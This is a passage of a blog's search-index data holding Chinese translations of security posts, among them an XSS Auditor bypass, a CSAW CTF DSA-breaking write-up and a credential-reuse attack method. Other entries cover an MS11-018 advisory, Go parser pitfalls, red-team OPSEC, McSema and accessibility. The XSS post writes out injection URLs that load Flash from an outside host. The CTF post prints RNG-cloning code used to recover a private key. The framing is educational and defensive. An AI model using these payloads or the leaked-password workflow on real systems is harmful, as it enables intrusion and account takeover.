⤻ͣ\r动漫/电影角色模型能为工作台注入独特个性。\n","date":"2025-08-01T22:33:33+08:00","permalink":"http://localhost:1313/p/%E7%A8%8B%E5%BA%8F%E5%91%98%E6%9C%80%E4%BD%B3%E6%A1%8C%E9%9D%A2%E9%85%8D%E7%BD%AE%E7%BB%88%E6%9E%81%E6%8C%87%E5%8D%97/","title":"程序员最佳桌面配置终极指南"},{"content":"利用Flash和base标签绕过XSS Auditor\r几天前，我正在和Mario一起研究如何绕过Chrome的XSS Auditor。Mario发现了这个绕过方法：\nXSS Auditor Bypasses 05.2016\n我也发现了另一个绕过方法。在这篇文章中，我想分享我的攻击向量。\n攻击向量\r1 2 3 https://vulnerabledoma.in/xss_auditortest?test=1\u0026amp;q=\u0026lt;embed+allowscriptaccess=always+src=/xss.swf\u0026gt;\u0026lt;base+href=//l0.cm/ \u0026lt;div\u0026gt;\u0026lt;embed allowscriptaccess=always src=/xss.swf\u0026gt;\u0026lt;base href=//l0.cm/\u0026lt;/div\u0026gt; 让我们来看看这个绕过方法的实现过程。\n分析过程\r直接使用\u0026lt;embed\u0026gt;标签加载外部资源会被拦截： 1 2 3 https://vulnerabledoma.in/xss_auditortest?test=1\u0026amp;q=\u0026lt;embed+src=https://evil/\u0026gt; \u0026lt;embed src=https://evil/\u0026gt; 但是加载同源且没有查询字符串的资源不会被拦截： 1 2 3 https://vulnerabledoma.in/xss_auditortest?test=1\u0026amp;q=\u0026lt;embed+src=/aaa\u0026gt; \u0026lt;embed src=/aaa\u0026gt; 如果我们能改变基础URL，就有可能实现XSS攻击。base标签通常也会被拦截，但如果它没有用\u0026gt;闭合，在某些情况下Auditor不会拦截。 以下情况会被拦截：\n1 2 3 https://vulnerabledoma.in/xss_auditortest?test=3\u0026amp;q=\u0026lt;base+href=//evil/ \u0026lt;div\u0026gt;\u0026lt;base href=//evil/ \u0026lt;/div\u0026gt; 但以下情况不会被拦截：\n1 2 3 https://vulnerabledoma.in/xss_auditortest?test=1\u0026amp;q=\u0026lt;base+href=//evil/ \u0026lt;div\u0026gt;\u0026lt;base href=//evil/\u0026lt;/div\u0026gt; 区别在于前者在注入点后有一个空格。看起来如果页面在注入点后直接有空格，Auditor会拦截。换句话说，如果页面在注入点后没有直接的空格，我们就可以注入base标签而不被拦截。\n因此，我的攻击向量有效！\n其他绕过方法\r如果注入点后有空格，我们还有机会绕过。如果注入点下方存在\u0026quot;字符，我们可以使用未闭合的属性引号来绕过Auditor，如\u0026lt;base href=\u0026quot;//evil/。\n以下情况不会被拦截：\n1 2 3 4 5 https://vulnerabledoma.in/xss_auditortest?test=4\u0026amp;q=\u0026lt;embed+allowscriptaccess=always+src=/xss.swf\u0026gt;\u0026lt;base+href=\u0026#34;//l0.cm/ \u0026lt;div\u0026gt; \u0026lt;embed allowscriptaccess=always src=/xss.swf\u0026gt;\u0026lt;base href=\u0026#34;//l0.cm/ \u0026lt;/div\u0026gt;\u0026lt;div id=\u0026#34;x\u0026#34;\u0026gt;AAA\u0026lt;/div\u0026gt; 这个绕过方法很有用，因为大多数页面在注入点下方都有\u0026quot;字符。\n另外，\u0026lt;script src=/xss.js\u0026gt;\u0026lt;/script\u0026gt;\u0026lt;base href=//evil/也不会被拦截。但我们无法加载外部资源，因为在设置base URL之前就开始加载了：\n1 https://vulnerabledoma.in/xss_auditortest?test=1\u0026amp;q=%3Cscript%20src=/xss.js%3E%3C/script%3E%3Cbase%20href=//evil/ 因此，我使用了Flash来实现攻击。\n总结\r这就是全部内容。感谢阅读我的文章！\n","date":"2025-08-01T22:26:13+08:00","permalink":"http://localhost:1313/p/%E5%88%A9%E7%94%A8flash%E5%92%8Cbase%E6%A0%87%E7%AD%BE%E7%BB%95%E8%BF%87xss-auditor%E7%9A%84%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/","title":"利用Flash和base标签绕过XSS Auditor的技术分析"},{"content":"CSAW CTF Crypto Challenge: Breaking DSA\rTrail of Bits密码学服务团队为最近的CSAW CTF贡献了两道密码学挑战。今天我们将解析其中较简单的一道，题目名为\u0026quot;灾难性安全设备——祝你好运，\u0026lsquo;k？\u0026quot;。\n这道题目涉及数字签名算法(DSA)，展示了表面安全的算法如何通过实现细节变得完全不安全。该挑战利用了两种漏洞，其中一个是PlayStation 3固件破解的根源，另一个则是无数软件产品中常见的安全漏洞来源。\n获取旗帜\r参赛者获得了源代码(main.py)和一个可交互的HTTP服务器。该服务器模拟在线签名服务，包含以下端点：\n/public_key：返回DSA公钥元素(p,q,g,y)的JSON编码整数 /sign/：对数据进行SHA1哈希后使用DSA私钥签名，返回两个整数(r,s) /forgotpass：使用random.getrandbits生成密码重置URL /resetpass：未实现的端点，调用返回500 /challenge：返回有效的Fernet令牌 /capture：当提供有效的Fernet令牌的DSA签名时，返回旗帜 DSA签名机制剖析\r完整的DSA密钥包含5个值：p,q,g,x和y。其中x是私钥值，我们需要恢复它。DSA签名的计算过程如下：\n选择随机数k(0 \u0026lt; k \u0026lt; q) 计算r = (g^k mod p) mod q 计算k的模逆kinv：(k * kinv) % q = 1 计算消息的SHA1哈希h 计算s = (kinv * (h + r * x)) % q 服务器中的签名实现如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 def sign(ctf_key: DSAPrivateKeyWithSerialization, data: bytes) -\u0026gt; tuple(int, int): data = data.encode(\u0026#34;ascii\u0026#34;) pn = ctf_key.private_numbers() g = pn.public_numbers.parameter_numbers.g q = pn.public_numbers.parameter_numbers.q p = pn.public_numbers.parameter_numbers.p x = pn.x k = random.randrange(2, q) kinv = _modinv(k, q) r = pow(g, k, p) % q h = hashlib.sha1(data).digest() h = int.from_bytes(h, \u0026#34;big\u0026#34;) s = kinv * (h + r * x) % q return (r, s) 数学漏洞利用\r从签名方程s = (kinv * (h + r * x)) % q出发，我们可以解出私钥x：\n1 x = (rinv * ((s * k) - h)) % q 关键在于预测随机数k的值。服务器使用Python的random模块(基于梅森旋转算法)生成k，这不是密码学安全的随机数生成器。\n随机数生成器攻击\r通过调用/forgotpass端点，我们可以获取梅森旋转算法的输出：\n1 2 3 4 @app.route(\u0026#34;/forgotpass\u0026#34;) def returnrand() -\u0026gt; str: random_value = binascii.hexlify(struct.pack(\u0026#34;\u0026gt;Q\u0026#34;, random.getrandbits(64))) return \u0026#34;https://innitech.local/resetpass/{}\u0026#34;.format(random_value.decode(\u0026#34;ascii\u0026#34;)) 我们实现了梅森旋转算法的克隆版本，可以预测未来的随机数输出：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 class ClonedMersenneTwister: length = 624 def __init__(self, state): self.state = state[:] self.index = 0 def next(self): if self.index == 0: self.generate_numbers() y = self.state[self.index] y = y ^ (y \u0026gt;\u0026gt; 11) y = y ^ (y \u0026lt;\u0026lt; 7) \u0026amp; 2636928640 y = y ^ (y \u0026lt;\u0026lt; 15) \u0026amp; 4022730752 y = y ^ (y \u0026gt;\u0026gt; 18) self.index = (self.index + 1) % self.length return y def generate_numbers(self): for i in range(self.length): y = ((self.state[i] \u0026amp; 0x80000000) + ((self.state[(i + 1) % self.length]) \u0026amp; 0x7fffffff)) self.state[i] = self.state[(i + 397) % self.length] ^ (y \u0026gt;\u0026gt; 1) if y % 2: self.state[i] ^= 2567483615 完整攻击流程\r通过多次调用/forgotpass重建RNG内部状态 调用/sign获取签名(r,s) 使用克隆的RNG预测k值 解方程恢复私钥x 验证x的正确性：pow(g,x,p)应当等于y 获取挑战令牌并签名，提交到/capture获取旗帜 总结\r在36小时的CSAW决赛中，44支队伍中有28支成功获取了旗帜。这个挑战展示了密码重置令牌生成与DSA签名随机数生成之间的意外关联，加上DSA算法的脆弱性，导致了灾难性的安全漏洞。\n在实际系统中，应避免使用非密码学安全的随机数生成器。如果不需要高性能或序列可重现性，应优先选择CSPRNG。此外，可以考虑使用更健壮的签名算法如ed25519(RFC 8032)，或采用确定性随机数生成(RFC 6979)来降低风险。\n","date":"2025-08-01T22:18:59+08:00","permalink":"http://localhost:1313/p/%E7%A0%B4%E8%A7%A3csaw-ctf%E5%8A%A0%E5%AF%86%E6%8C%91%E6%88%98dsa%E7%AD%BE%E5%90%8D%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","title":"破解CSAW CTF加密挑战：DSA签名漏洞分析"},{"content":"今天微软发布了MS11-018安全更新，修复了上个月CanSecWest 2011 Pwn2Own竞赛中用于攻破IE8的三个漏洞之一。成功入侵IE8需要组合利用这三个漏洞才能满足主办方的全部要求。\n本次修复的漏洞是一个不影响IE9的释放后使用(UAF)漏洞，攻击者主要利用该漏洞实现代码执行。第二个漏洞用于提高攻击可靠性，第三个漏洞则用于突破IE保护模式。\nIE9为何不受影响？ 在IE9开发过程中，团队内置了多项安全功能以尽早发现安全问题。该漏洞通过模糊测试发现，IE团队在10个月前就已修复。竞赛中用作信息泄露的另一个漏洞同样在IE9开发阶段被发现并修复。\n为何修复速度如此之快？ 通常所有安全补丁都需要经过漫长的回归测试。本次修复同样经历了该流程，但由于该问题曾在IE9上测试过，使得修复进程得以加速。\n其余两个漏洞何时修复？ 需要说明的是：\n第一个是\u0026quot;堆地址泄露\u0026quot;漏洞，攻击者借此可避免大规模堆喷射。需注意该漏洞仅泄露堆地址而非堆内容（如虚表指针） 第二个是IE保护模式绕过漏洞 这两个漏洞正在评估中，将在后续更新周期修复。但若没有MS11-018修复的本月漏洞，其余漏洞不会对用户构成直接威胁。\nFermin J. Serna, MSRC工程团队\n","date":"2025-08-01T22:11:32+08:00","permalink":"http://localhost:1313/p/ms11-018%E4%BF%AE%E5%A4%8Die8-pwn2own%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/","title":"MS11-018修复IE8 pwn2own漏洞的技术分析"},{"content":"Go语言解析器中的意外安全陷阱\r在Go应用程序中，解析不可信数据会形成危险的攻击面。通过三个真实攻击场景，我们揭示了Go标准库解析器中的安全隐患：\n攻击场景1：意外(反)序列化数据\r当开发者使用json:\u0026quot;-\u0026quot;标记试图阻止字段被反序列化时，错误添加的逗号后缀会导致该字段仍可通过\u0026quot;-\u0026quot;键被修改：\n1 2 3 type User struct { IsAdmin bool `json:\u0026#34;-,omitempty\u0026#34;` // 错误配置：仍可通过{\u0026#34;-\u0026#34;:true}注入 } 我们创建的Semgrep规则可检测此类问题：semgrep -c r/trailofbits.go.unmarshal-tag-is-dash\n攻击场景2：解析器差异\rGo的JSON解析器存在两项危险特性：\n重复键处理：总是取最后出现的键值 大小写不敏感匹配：\u0026quot;action\u0026quot;、\u0026quot;ACTION\u0026quot;甚至Unicode变体(aKtionſ)都会被匹配 当微服务架构中不同组件使用不同解析器时，这种差异会导致权限绕过：\n1 2 3 graph TD A[恶意请求] --\u0026gt; B{\u0026#34;授权服务:解析为UserAction\u0026#34;} A --\u0026gt; C{\u0026#34;业务服务:解析为AdminAction\u0026#34;} 攻击场景3：数据格式混淆\r通过构造特殊的多格式混合文件(Polyglot)，可使JSON/XML/YAML解析器解析同一文件时产生不同结果：\n1 2 3 4 5 { \u0026#34;action\u0026#34;: \u0026#34;Action_1\u0026#34;, \u0026#34;aCtIoN\u0026#34;: \u0026#34;Action_2\u0026#34;, \u0026#34;comment\u0026#34;: \u0026#34;\u0026lt;action\u0026gt;Action_3\u0026lt;/action\u0026gt;\u0026#34; } 该payload会：\nJSON解析为Action_2（取最后匹配+大小写不敏感） YAML解析为Action_1（精确匹配） XML解析为Action_3（提取XML片段） 防护建议\r启用严格模式： 1 2 decoder := json.NewDecoder(reader) decoder.DisallowUnknownFields() 期待JSON v2：将默认禁止重复键并启用大小写敏感匹配 边界一致性检查：跨服务处理时验证数据格式一致性 使用静态分析：我们提供的Semgrep规则可检测常见错误配置 这些解析器特性已导致真实漏洞，包括Hashicorp Vault认证绕过(CVE-2020-16250)等案例。开发者需要特别警惕大小写不敏感匹配这类Go特有行为。\n","date":"2025-08-01T22:04:53+08:00","permalink":"http://localhost:1313/p/go%E8%AF%AD%E8%A8%80%E8%A7%A3%E6%9E%90%E5%99%A8%E4%B8%AD%E7%9A%84%E6%84%8F%E5%A4%96%E5%AE%89%E5%85%A8%E9%99%B7%E9%98%B1/","title":"Go语言解析器中的意外安全陷阱"},{"content":"突破传统黑客极限\r穿上你的瓜亚贝拉衬衫，Infiltrate盛会即将开启。Trail of Bits自2015年起持续赞助并全员参与这一顶尖会议（今年多达18人！）。除了交换纪念品，我们更期待见证最新安全研究成果——包括我们自己的突破性贡献。\n技术亮点前瞻\r二进制摇滚明星进阶\rSophia d\u0026rsquo;Antoine将联合Binary Ninja开发者呈现《成为二进制摇滚明星：漏洞研究中的高阶静态分析》，基于其先前将抽象解释引入Binary Ninja的研究成果进行深度扩展。\nManticore实战体验\r我们将展示CGC机器人的核心——Manticore二进制符号执行引擎（支持x86/x86-64/ARM架构）。参会者可通过解决挑战任务提前体验这一即将开源的工具，并赢取专属马克杯。\n往届技术回眸\r2016年我们曾分享：\n《构建可扩展的自动化黑客系统》 《Swift逆向工程实践》 NOP认证竞赛中与ImmunityDbg的激烈对抗（7分33秒弹出计算器） 本届重磅议题\rJustin Schuh：《四面楚歌：防御战壕中的现实视角》 Vasilis团队：《安卓libc分配器的堆利用辅助技术》 Jean-Philippe：《Signal应用漏洞狩猎》 Ralf-Phillip：《基带处理器中的shellcode踪迹》 会议独特价值\rInfiltrate以浓缩顶级会议精华内容著称，其特色包括：\n与演讲者/顶尖研究者的深度交流（\u0026ldquo;强力大厅会议\u0026quot;文化） 全包式优质餐饮活动 严禁无票蹭会（笑） \u0026ldquo;拉斯维加斯已成过往，真正的盛宴在迈阿密\u0026rdquo;——我们现场见！\n本文提及的所有技术工具与研究均可在Trail of Bits开源项目库中找到对应实现。\n","date":"2025-08-01T21:58:00+08:00","permalink":"http://localhost:1313/p/%E5%9B%9B%E6%9C%88%E6%B8%97%E9%80%8F%E5%AD%A3-trail-of-bits%E5%8D%9A%E5%AE%A2%E8%81%9A%E7%84%A6%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90%E4%B8%8E%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/","title":"四月渗透季 - Trail of Bits博客聚焦二进制分析与漏洞研究"},{"content":"我们刚刚完成了在前期项目中绕过Cylance防护的全过程演示。作为这个精彩系列的收官之作，我想分享几点关键观察。\n首先需要明确，作为渗透测试团队，我们只测试客户实际部署的环境，而非厂商指定的理想配置。尽管使用的技术非常基础（例如简单的脚本混淆和载荷拆分），但这些方法确实有效突破了防护——这本身就值得反思反病毒厂商的宣传话术。\n关于测试权限的争议值得关注。Cylance与CrowdStrike等厂商在用户协议中严格限制第三方测试的行为，这就像汽车厂商禁止媒体评测其产品般荒谬。必须说明的是，Cylance相比传统黑名单反病毒已有显著进步——在我们的测试中，它对某些高级威胁的检测确实展现了优势。\n白名单技术讨论是核心议题。虽然启用应用白名单（如通过AppLocker或SRP）能阻断我们90%的攻击路径，但这并非某个厂商的专利功能。问题在于企业往往因运维成本放弃启用这些功能，而厂商将未启用增强功能作为检测失败的借口并不合理。\n行业现状令人担忧：\n安全产品评测缺乏客观性（如NSS Labs报告存在明显缺陷） 不存在\u0026quot;银弹\u0026quot;解决方案——Cylance宣称的AI预测攻击能力尚未经实践验证 真正的安全需要架构级解决方案，包括应用白名单和出口流量管控 最后必须强调：部署任何高级端点防护产品都不是简单的\u0026quot;轻松按钮\u0026quot;。实施过程需要专业团队持续维护，否则防护效果将大打折扣。\n致谢：本系列技术实现基于Casey Smith和@_TacoRocket的前沿研究，推荐阅读Colby Farley的博客（https://pwningroot.com/）获取更多绕过技巧。\n","date":"2025-08-01T21:50:47+08:00","permalink":"http://localhost:1313/p/%E7%BB%95%E8%BF%87cylance%E9%98%B2%E6%8A%A4%E7%AC%AC%E4%BA%94%E9%83%A8%E5%88%86-%E6%9C%AA%E6%9D%A5%E5%B1%95%E6%9C%9B/","title":"绕过Cylance防护：第五部分 - 未来展望"},{"content":"红队行动中的数据泄露挑战\r在远程红队演练中，与目标网站的每次交互、发送的每封邮件、探测的每个网络服务都会留下可追溯痕迹。成熟的蓝队能够通过信息关联识别红队行为，进而实施阻断或部署反制措施。\n技术对抗要点\r泄露源头控制\n工作站本地配置（0:40:42） 操作系统级修改（0:45:01） 工具特征伪装（0:49:44） 源IP地址保护体系（0:56:35） 基础设施架构\n故障保护型VPN部署（1:01:36） 第三方服务风险隔离（1:02:57） 网络服务指纹混淆（1:10:05） 标准化流程建设\n新工具测试方法论（1:15:19） 防御视角的OPSEC评估框架（0:38:06） 技术实现路径\r通过系统级修改消除工具特征（如修改C2通信指纹） 构建多跳代理架构实现IP地址保护 建立工具测试沙箱环境验证可检测性 \u0026ldquo;红队必须像防御者一样思考，这种思维模式能适应未来新型工具的安防对抗\u0026rdquo; —— Michael Allen（持有OSCE/MLSE/CISSP认证）\n完整技术幻灯片下载\n加入BHIS技术社区\n","date":"2025-08-01T21:44:07+08:00","permalink":"http://localhost:1313/p/%E8%BF%9C%E7%A8%8B%E7%BA%A2%E9%98%9F%E8%A1%8C%E5%8A%A8%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80-%E6%93%8D%E4%BD%9C%E5%AE%89%E5%85%A8%E6%A0%B8%E5%BF%83%E8%A6%81%E7%82%B9%E8%A7%A3%E6%9E%90/","title":"远程红队行动安全基础 - 操作安全核心要点解析"},{"content":"利用个人账户密码重复问题获取域凭证：无需接入目标网络的攻击方法（第一部分）\r作者：Beau Bullock\n在本系列文章中，我将详细介绍无需接入目标组织网络即可获取域用户凭证的多种方法。第一部分重点探讨如何利用员工在个人账户重复使用企业密码的行为；第二部分将介绍通过发现目标组织的用户名架构，并对外部服务（如Outlook Web Access门户）实施密码喷洒攻击的更复杂技术。\n本文不涉及便利贴密码问题\r个人账户的凭证重用现象\r用户在多个网络服务中重复使用相同密码是普遍存在的安全隐患。当某个网站遭到入侵时，若员工在个人账户和企业账户使用相同密码，攻击者获取个人凭证后即可间接获得企业账户访问权限。\n突破传统分析思路\r常规的凭证泄露分析通常仅关注目标组织拥有的域名。更有效的方法是尝试定位企业员工在第三方服务中泄露的个人账户。当目标组织本身提供个人账户服务时（如Google员工可能拥有gmail.com账户），这种关联会变得更容易。\n实战案例：从5万条泄露数据中定位员工凭证\r在一次测试中，作者通过Pwnedlist.com发现目标组织的客户域名存在超过50,000个近期泄露账户。通过与组织沟通，确认员工可能使用这些\u0026quot;技术上的个人账户\u0026quot;。\n关键步骤：\n使用Pipl.com搜索引擎关联泄露邮箱与员工身份 通过Burp Suite Intruder批量提交50,000个邮箱 筛选包含目标公司名称的\u0026quot;Career\u0026quot;字段 最终定位到252个疑似员工个人账户 凭证转换与验证\r通过侦察获取企业邮箱命名规则（如firstname.lastname@格式）后：\n将个人账户信息转换为企业邮箱格式 使用泄露的密码尝试登录企业外部门户（如OWA） 成功访问重复使用密码的员工企业邮箱 攻击流程总结\r通过Pwnedlist等平台收集目标组织关联的个人账户泄露凭证 使用Pipl验证账户持有人的雇主信息 根据企业邮箱规则转换个人账户信息 尝试凭证重用攻击 防御建议\r推行密码管理工具，杜绝员工在多平台重复使用密码的行为。\n下篇将详细介绍如何通过发现用户名架构实施密码喷洒攻击。点击此处阅读第二部分\n","date":"2025-08-01T21:37:19+08:00","permalink":"http://localhost:1313/p/%E5%88%A9%E7%94%A8%E4%B8%AA%E4%BA%BA%E8%B4%A6%E6%88%B7%E5%AF%86%E7%A0%81%E9%87%8D%E5%A4%8D%E9%97%AE%E9%A2%98%E8%8E%B7%E5%8F%96%E5%9F%9F%E5%87%AD%E8%AF%81%E6%97%A0%E9%9C%80%E6%8E%A5%E5%85%A5%E7%9B%AE%E6%A0%87%E7%BD%91%E7%BB%9C%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86/","title":"利用个人账户密码重复问题获取域凭证：无需接入目标网络的攻击方法（第一部分）"},{"content":"如何在WooCommerce感谢页面添加转化跟踪代码\r要将转化跟踪代码添加到WooCommerce感谢页面（以Google Ads为例），并动态插入订单值（如金额、货币、order_id），请在子主题的functions.php中使用以下代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 function custom_conversion_tracking( $order_id ) { $order = wc_get_order( $order_id ); ?\u0026gt; \u0026lt;script\u0026gt; gtag(\u0026#34;event\u0026#34;, \u0026#34;conversion\u0026#34;, { \u0026#34;send_to\u0026#34;: \u0026#34;Tracking-code-here-XXXXXXXXXX\u0026#34;, \u0026#34;value\u0026#34;: \u0026lt;?php echo $order-\u0026gt;get_total(); ?\u0026gt;, \u0026#34;currency\u0026#34;: \u0026#34;\u0026lt;?php echo $order-\u0026gt;get_currency(); ?\u0026gt;\u0026#34;, \u0026#34;transaction_id\u0026#34;: \u0026lt;?php echo $order_id; ?\u0026gt; }); \u0026lt;/script\u0026gt; \u0026lt;?php } add_action( \u0026#39;woocommerce_thankyou\u0026#39;, \u0026#39;custom_conversion_tracking\u0026#39; ); 如果要将代码添加到HEAD中，请使用：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 function custom_conversion_tracking(){ // 在order-received端点 if( is_wc_endpoint_url( \u0026#39;order-received\u0026#39; ) ) : // 获取订单ID $order_id = absint( get_query_var(\u0026#39;order-received\u0026#39;) ); if( get_post_type( $order_id ) !== \u0026#39;shop_order\u0026#39; ) return; $order = wc_get_order( $order_id ); ?\u0026gt; \u0026lt;script\u0026gt; gtag(\u0026#34;event\u0026#34;, \u0026#34;conversion\u0026#34;, { \u0026#34;send_to\u0026#34;: \u0026#34;Tracking-code-here-XXXXXXXXXX\u0026#34;, \u0026#34;value\u0026#34;: \u0026lt;?php echo $order-\u0026gt;get_total(); ?\u0026gt;, \u0026#34;currency\u0026#34;: \u0026#34;\u0026lt;?php echo $order-\u0026gt;get_currency(); ?\u0026gt;\u0026#34;, \u0026#34;transaction_id\u0026#34;: \u0026lt;?php echo $order_id; ?\u0026gt; }); \u0026lt;/script\u0026gt; \u0026lt;?php endif; } add_action( \u0026#39;wp_head\u0026#39;, \u0026#39;custom_conversion_tracking\u0026#39; ); ","date":"2025-08-01T21:30:47+08:00","permalink":"http://localhost:1313/p/%E5%A6%82%E4%BD%95%E5%9C%A8woocommerce%E6%84%9F%E8%B0%A2%E9%A1%B5%E9%9D%A2%E6%B7%BB%E5%8A%A0%E8%BD%AC%E5%8C%96%E8%B7%9F%E8%B8%AA%E4%BB%A3%E7%A0%81/","title":"如何在WooCommerce感谢页面添加转化跟踪代码"},{"content":"McSema：二进制转LLVM比特码工具重大升级\r我们的x86机器码转LLVM比特码工具McSema刚刚完成全面升级。上周举办的开发马拉松显著改善了McSema的易用性、文档质量和代码质量，现在使用McSema分析和逆向工程二进制文件比以往任何时候都更容易。\n发展阶段\rMcSema已成为我们日常工作中不可或缺的工具，它能帮助我们发现并加固二进制程序的安全漏洞、独立验证供应商源代码，以及生成高代码覆盖率的应用测试。该工具不仅应用于学术研究，还参与DARPA项目。自2014年开源以来，我们（及其他贡献者）持续扩展其功能以分析日益复杂的程序。\n性能优化\r构建速度：通过清理死代码、移除冗余库及优化目录结构，构建系统更简洁 比特码生成：改进控制流图遍历算法，移除Boost依赖，简化比特码生成流程 比特码质量：取消函数入口/出口的寄存器上下文存储，改用原生位宽操作处理标志位，新增惰性生成比特码优化功能 现代化改造\r升级至标准版LLVM 3.8（原使用定制版LLVM 3.5） 完全移除Boost依赖，改用C++11现代特性 功能简化\r统一命令行接口：mcsema-disass负责反汇编，mcsema-lift执行比特码转换 弃用定制反汇编器bin_descend，统一采用IDA Pro作为反汇编引擎 重构代码结构，精简CMake构建脚本 采用无外部依赖的集成测试框架 新增特性\r支持更多指令集（提供指令添加指南） 新增--list-supported命令查看支持指令列表 集成测试框架支持快速添加全面翻译测试 文档完善\r全新文档详细说明安装流程、使用方法、测试方案、功能扩展和调试技巧，并包含常见错误解决方案，显著降低第三方开发者的参与门槛。\n运行时增强\r提升运行效率，大幅降低内存占用，改进与原生Windows/Linux代码的复杂交互能力，使转换后的比特码不仅能用于静态分析，还可重新编译为可执行程序。\n未来规划\r扩展对复杂软件的支持 计划采用Binary Ninja替代IDA Pro进行控制流恢复 新增ARM架构二进制转LLVM比特码功能 拓展移动应用和嵌入式固件分析场景 我们正在招募对McSema开发感兴趣的实习生。入门者可先尝试Linux二进制转换教程，了解如何使libFuzzer等工具作用于二进制文件。如有创新构想，欢迎联系我们——若方案可行，我们将提供资金支持实现。\n","date":"2025-08-01T21:24:22+08:00","permalink":"http://localhost:1313/p/mcsema%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%BD%ACllvm%E6%AF%94%E7%89%B9%E7%A0%81%E5%B7%A5%E5%85%B7%E9%87%8D%E5%A4%A7%E5%8D%87%E7%BA%A7/","title":"McSema二进制转LLVM比特码工具重大升级"},{"content":"州和地方政府网络安全现代化转型\r作者：Darren Estridge 和 Thomas MacLellan\n发布日期：2025年7月8日\n州政府的网络安全领导者们深知，地方机构正日益成为网络攻击的主要目标。从破坏州卫生系统的勒索软件到针对政府员工的钓鱼攻击，威胁不断升级，造成的财务和运营影响也愈发严重。根据《2023年K-12教育系统六年回顾报告》，近80个学区（涉及2000多所学校）遭受勒索软件攻击，导致停课、教学中断及学生数据泄露。然而，许多州机构仍在过度采购功能重复且缺乏整合的网络安全工具，无法匹配攻击的速度和规模。\n防御现代化的新思路\r州IT领导者需要改变防御现代化的方法。与联邦层面类似，单纯增加工具数量并不等同于增强防护。零散的采购会耗尽有限资源、增加操作复杂性并延缓响应速度。出路在于通过战略性的公私合作实现效率提升、系统整合和更智能的投资，借助私营部门的创新能力强化政府防护体系。\n州IT网络安全新战略\r各州机构（无论是公共安全、医疗还是教育部门）的孤立系统会导致重复劳动、响应迟缓以及纳税人资金使用效率低下。州首席信息官（CIO）和安全官（CISO）正意识到必须摆脱这种碎片化模式。Palo Alto Networks通过将安全运营整合至统一的AI驱动平台来支持这一转型——该模式已在联邦机构和财富100强企业中得到验证。\n但任何机构都不应孤军奋战。与私营网络安全供应商的战略合作能带来州IT部门内部无法获取的专业知识和威胁情报。公私合作可实现可扩展、可持续的安全现代化，确保州机构在有效管理资源的同时应对威胁。\n成功现代化的关键考量\r成本优化：减少工具数量可降低许可、维护和培训成本 简化运营：统一安全平台减轻管理负担 安全利用AI：跟踪监控每位员工的AI使用情况 加速威胁响应：AI驱动自动化提升检测与处置速度 改进合规性：集中化可视性实现持续监控以满足报告和合规要求 通过与可信行业伙伴合作，各州可部署跨机构无缝协作的整体平台化解决方案，在降低复杂性的同时提升韧性。这种平台化战略能使州政府将预算从重复浪费转向主动防御。\n规模化AI驱动的防御体系\r该战略的核心是Precision AI®——每日可识别和分类900万次威胁的自动化防御引擎。面对人手不足或身兼多职的州IT团队，AI与自动化能显著改善平均检测时间（MTTD）和平均响应时间（MTTR）等关键指标。在Palo Alto Networks的安全运营中心（SOC），MTTR已缩短至检测后一分钟内，确保在威胁升级前快速精准响应。这些成果正是公共机构与私营创新紧密协作的体现。\n云迁移中的安全保障\r随着各州将财务系统到应急服务全面转向\u0026quot;云优先\u0026quot;策略，网络安全必须同步演进。通过FedRAMP和GovRAMP High认证的Prisma® Cloud为多云和混合环境提供从开发到部署的端到端防护。云创新的速度使州机构难以独自确保安全，与可信供应商合作能在保证合规性和敏捷性的同时避免复杂性增加或出现可视性缺口。\n专为州IT需求打造\rPalo Alto Networks的公共部门团队深入理解各州环境的特殊性——从治理约束、采购流程到多机构协作。我们提供定制化解决方案消除低效环节，在全州生态系统中降低风险并提升服务交付能力。团队通过案例研究和行业基准提供可量化的关键绩效指标（KPI），确保解决方案直接对接管理层优先级。\n通过采用统一的AI驱动方案并发挥公私合作优势，州政府能有效保护公民数据、优化成本，构建更具韧性的数字未来。\n美国制造·为政府而生\r总部位于加州的Palo Alto Networks拥有20年网络安全创新领导经验。我们在全美49个州拥有8,800多名员工，硬件防火墙全部在美国德克萨斯州主装配中心生产。每年投入超过18亿美元的研发资金，持续推动美国技术领导力发展。\nPalo Alto Networks已准备好帮助各州IT机构实现网络安全现代化，共同构建更安全、更智能的未来。\n","date":"2025-08-01T21:17:43+08:00","permalink":"http://localhost:1313/p/%E5%B7%9E%E5%92%8C%E5%9C%B0%E6%96%B9%E6%94%BF%E5%BA%9C%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%8E%B0%E4%BB%A3%E5%8C%96%E8%BD%AC%E5%9E%8B/","title":"州和地方政府网络安全现代化转型"},{"content":"单页应用(SPA)无障碍最佳实践\r现代网络用户期望获得快速、流畅的交互体验。单页应用(SPA)通过无需重新加载页面即可实时更新内容的方式满足了这一需求。然而，这种动态特性也给依赖辅助技术的残障用户带来了特殊的可访问性挑战。\nSPA工作原理\r传统网站如同图书馆系统，每次请求新页面都需要服务器处理。而SPA则像随身携带的魔法书车，初始加载后所有内容更新都在后台完成，提供无缝的浏览体验。\nSPA的无障碍挑战\r1. 动态内容更新\rSPA使用JavaScript框架实时更新页面部分内容，但不会自动通知屏幕阅读器。例如购物车商品数量变化时，若未正确实现ARIA实时区域属性，视障用户可能无法获知操作结果。\n代码示例展示了模态窗口的焦点管理问题：\n1 2 3 4 5 6 7 8 9 function openModal() { document.getElementById(\u0026#39;myModal\u0026#39;).style.display = \u0026#39;block\u0026#39;; document.getElementById(\u0026#39;closeModalButton\u0026#39;).focus(); } function closeModal() { document.getElementById(\u0026#39;myModal\u0026#39;).style.display = \u0026#39;none\u0026#39;; } // 关闭模态窗后未恢复焦点会导致键盘用户迷失位置 2. 